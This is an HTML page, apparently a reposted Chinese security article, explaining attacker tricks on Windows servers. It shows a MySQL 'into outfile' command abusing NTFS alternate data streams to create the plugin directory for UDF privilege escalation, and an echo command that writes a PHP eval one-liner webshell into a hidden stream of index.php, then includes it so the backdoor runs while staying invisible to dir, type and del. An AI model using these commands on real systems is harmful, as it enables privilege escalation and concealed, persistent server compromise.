@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Win下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Win下MySQL提权时无法创建目录解决办法及数据流隐藏Webshell</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650437964&amp;idx=5&amp;sn=ebf779afd00677ae8d87b8f5b3d93891&amp;chksm=83bb1ca8b4cc95be21b9288737f6f6805d715c6a24ecd8597f90647ac21ab3cdeed7f2b7d6c8&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=2650437964&amp;idx=5&amp;sn=ebf779afd00677ae8d87b8f5b3d93891&amp;chksm=83bb1ca8b4cc95be21b9288737f6f6805d715c6a24ecd8597f90647ac21ab3cdeed7f2b7d6c8&amp;scene=27#wechat_redirect</a></blockquote><p class="dropcap" style="">这个其实是NTFS惹的祸。NTFS中的ADS（交换数据流）可以建立目录，隐藏webshell等等。<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><strong style="box-sizing: border-box; font-weight: 700; color: rgb(34, 34, 34);">0x01 Mysql创建目录</strong><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>当MySQL版本较高时，自定义函数的dll需要放在mysql目录下的lib\plugin\。一般普通的脚本是没有在这个文件夹下创建文件夹的权限的。这里可以用到ads来突破：</p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>select 'xxx' into outfile 'D:\\mysql\\lib::$INDEX_ALLOCATION';</p></li></ol><p><span style="">会在mysql目录下生成一个lib目录，这样你就可以将你的udf放在这个插件目录下了。   </span><br style=""/><br style=""/><strong style="">0x02 隐藏webshell</strong><br style=""/><br style=""/><span style="">在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</span></p><ol class=" list-paddingleft-2" style="list-style-type: decimal;"><li><p>echo ^&lt;?php @eval(request[xxx])?^&gt;  &gt; index.php:a.jpg</p></li></ol><p><span style="">这样子就生成了一个不可见的shell a.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个a.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:a.jpg’)?&gt;，这样子就可以正常解析我们的一句话了。</span><br style=""/><span style="">其他ads的利用各位可以参考互联网。</span></p><p><br/></p>
+        
+</body>
+</html>
